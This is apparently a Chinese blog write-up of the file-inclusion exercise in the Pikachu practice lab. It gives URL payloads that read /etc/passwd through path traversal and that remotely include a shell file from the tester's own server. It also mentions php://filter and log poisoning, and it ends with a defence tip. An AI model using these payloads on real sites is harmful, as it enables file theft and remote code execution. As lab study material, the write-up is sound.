---
title: Pikachu-文件包含
date: 2026-11-23
tags: [Pikachu, WEB, 文件包含]
excerpt: 本地包含读文件，远程包含执行代码，还可以配合伪协议。
---

思路：Pikachu 的文件包含模块分本地和远程两种。本地包含用 ../ 穿越读文件，远程包含需要 allow_url_include 开启，拉取远端代码执行。

问题：
1. 不知道包含点在哪。
2. 本地包含层数不好判断。
3. 远程包含一直失败，不知道是配置还是地址问题。

解决：
1. 本地包含：?filename=../../../../etc/passwd，读到内容说明漏洞成立。
2. 再读站点源码（fi_local.php），看有没有进一步利用点。
3. 远程包含：?filename=http://自己的服务器/shell.txt，如果被执行说明 allow_url_include 开着。
4. 结合 php://filter 读源码，或者结合日志写入实现代码执行。
5. 拿到目标内容，提交通过。

补充：
1. 远程包含依赖 allow_url_include=On（默认关），本地包含只依赖 allow_url_fopen 或直接读本地文件。
2. Pikachu 的 include 目录里有几张 png 和几个 php，可以拿来做"包含图片里的代码"这类练习。
3. 防御：include 路径白名单 + 关闭 allow_url_include。

工具：浏览器、Burp Suite、本地 HTTP 服务

踩坑记录：
1. 本地包含层数加少了，读不到；直接多写几层反而通。
2. 远程包含地址用了 localhost，服务器访问不到自己，得用实际 IP。
3. 读源码时直接 include 会执行，得用 php://filter 编码后读。

总结：文件包含的两个方向——"读"（本地 + 伪协议）和"执行"（远程 + 日志投毒）。理解 PHP 的包含机制，比记 payload 更重要。
